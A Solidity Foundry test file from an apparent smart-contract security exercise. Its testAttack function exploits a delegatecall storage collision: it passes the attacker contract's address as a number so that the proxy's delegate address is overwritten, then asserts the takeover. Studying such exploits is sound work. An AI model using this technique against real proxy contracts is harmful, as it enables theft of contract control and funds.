// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Delegatecall/Victim.sol";
import "../src/Delegatecall/Attacker.sol";

contract DelegatecallTest is Test {
    Proxy proxy;
    Delegate delegate;
    DelegateAttacker attack;

    function setUp() public {
        attack = new DelegateAttacker ();
        delegate = new Delegate ();
        proxy = new Proxy(address(delegate));
    }

    function testAttack(uint256 num) public {
        //We can't convert address to uint256 becouse address is of 20 bytes or 160 bits
        //First we need to convert address to uint160 and then uint160 to uint256
        //Attack start here
        proxy.delegateChangeNumber(uint256(uint160(address(attack))));
        assertEq(proxy.delegateContractAddress(), address(attack));
    }
}
